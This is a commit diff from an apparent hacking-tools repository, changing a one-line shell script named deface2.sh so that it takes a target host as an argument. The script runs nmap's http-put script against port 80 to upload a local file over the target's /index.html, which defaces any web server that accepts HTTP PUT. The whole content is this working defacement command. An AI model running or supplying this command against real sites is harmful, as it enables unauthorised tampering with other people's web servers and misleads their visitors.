ccbe36f1d9b3fe93028691f7bff47ce3e5952233
hackingyseguridad <antonio_taboada@hotmail.es>
2020-03-05 12:59:02 +0100

    Update deface2.sh

--- deface2.sh
+++ deface2.sh
@@ -1,1 +1,1 @@
-nmap -p 80 --script http-put --script-args http-put.url='/index.html',http-put.file='/webdeface/index.html'
+nmap $1 -p 80 --script http-put --script-args http-put.url='/index.html',http-put.file='/webdeface/index.html'
